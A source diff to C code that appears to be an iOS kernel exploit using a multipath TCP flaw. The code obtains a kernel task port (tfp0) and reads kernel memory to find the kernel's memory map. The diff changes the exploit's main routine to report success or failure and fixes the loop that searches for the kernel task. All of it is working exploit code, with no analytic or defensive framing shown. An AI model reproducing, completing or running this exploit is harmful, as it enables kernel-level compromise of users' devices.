@@ -517,7 +517,7 @@ mach_port_t prepare_tfp0(uint64_t vm_map, uint64_t receiver) {
     return early_read_port;
 }
 
-void mptcp_go() {
+bool mptcp_go() {
     offsets_init();
     
     // increase the limit on the number of open files:
@@ -635,13 +635,13 @@ void mptcp_go() {
     int replacer_pipe = find_replacer_pipe(&msg_contents);
     if (replacer_pipe == -1) {
         LOG("failed to get a pipe buffer over a port\n");
-        return;
+        return false;
     }
     
     // does the pipe buffer contain the mach message we sent to ourselves?
     if (msg_contents == NULL) {
         LOG("didn't get any message contents\n");
-        return;
+        return false;
     }
     
     LOG("this should be the empty prealloc message\n");
@@ -686,7 +686,7 @@ void mptcp_go() {
     
     if (replacer_port == MACH_PORT_NULL) {
         LOG("failed to find replacer port\n");
-        return;
+        return false;
     }
     
     LOG("found replacer port\n");
@@ -766,6 +766,7 @@ void mptcp_go() {
         uint32_t pid = early_rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
         if (pid != 0) {
             LOG("task isn't the kernel task\n");
+            continue;
         }
         
         // found the right task, get the vm_map
@@ -775,7 +776,7 @@ void mptcp_go() {
     
     if (kernel_vm_map == 0) {
         LOG("unable to find the kernel task map\n");
-        return;
+        return false;
     }
     
     LOG("kernel map:%016llx\n", kernel_vm_map);
@@ -906,5 +907,6 @@ void mptcp_go() {
     
     // that should have cleared everything up!
     LOG("done!\n");
+    return true;
 }
 
